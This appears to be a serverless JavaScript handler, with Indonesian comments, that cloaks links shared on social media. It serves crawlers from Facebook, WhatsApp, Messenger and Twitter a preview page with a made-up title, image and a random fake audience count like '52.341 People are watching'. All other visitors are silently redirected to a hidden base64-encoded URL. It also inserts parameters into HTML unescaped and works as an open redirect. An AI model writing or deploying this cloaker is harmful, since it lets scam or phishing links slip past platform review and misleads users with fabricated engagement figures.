export async function onRequest(context) {
  const { searchParams } = new URL(context.request.url);
  const p = searchParams.get('p');
  
  // Link default kalau p kosong
  let u = 'https://google.com', t = 'Loading...', i = '';

  if (p) {
    try {
      const decoded = atob(p);
      const params = new URLSearchParams(decoded);
      u = params.get('u') || u;
      t = params.get('t') || t;
      i = params.get('i') || i;
    } catch (e) {}
  }

  // LOGIKA RANDOM DESKRIPSI
  // Membuat angka random antara 10.000 sampai 100.000
  const randomNum = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
  // Format angka pake titik (misal: 52.341)
  const formattedNum = randomNum.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
  
  // Pilih variasi teks secara random
  const variations = [
    `${formattedNum} Online Members`,
    `${formattedNum} Views Active`,
    `${formattedNum} People are watching`,
    `${formattedNum} Members Online`,
    `${formattedNum} Active Now`
  ];
  const d = variations[Math.floor(Math.random() * variations.length)];

  const ua = context.request.headers.get('user-agent') || '';
  const isBot = /facebookexternalhit|Facebot|WhatsApp|Messenger|Twitterbot/i.test(ua);

  if (isBot) {
    return new Response(`<!DOCTYPE html>
    <html>
      <head>
        <meta charset="utf-8">
        <title>${t}</title>
        <meta name="description" content="${d}">
        <meta property="og:title" content="${t}">
        <meta property="og:description" content="${d}">
        <meta property="og:image" content="${i}">
        <meta property="og:type" content="website">
        <meta property="og:image:width" content="1200">
        <meta property="og:image:height" content="630">
        <meta name="twitter:card" content="summary_large_image">
      </head>
      <body></body>
    </html>`, { 
      headers: { "content-type": "text/html;charset=UTF-8" } 
    });
  }

  return new Response(null, { status: 302, headers: { "Location": u } });
}